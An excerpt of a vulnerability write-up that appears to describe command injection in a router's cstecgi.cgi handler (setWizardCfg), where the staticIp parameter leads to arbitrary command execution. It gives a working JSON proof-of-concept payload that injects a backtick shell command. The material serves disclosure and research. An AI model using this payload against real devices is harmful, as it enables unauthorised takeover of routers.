...
The vulnerability is located in the function `sub_423AD8` within `cstecgi.cgi`, also known as `setWizardCfg`.

![](Pasted%20image%2020231130001710.png)
...
therefore , by controlling parameter `staticIp` (tbh there are a few parameter can make same result in this function) , we can finally make an arbitrary command execution
...
{"proto":"0","staticIp":"`id > /1.txt;`","topicurl":"setWizardCfg","token":"00000000000000000000000000000000"}
~~~
...
![](Pasted%20image%2020231130001949.png)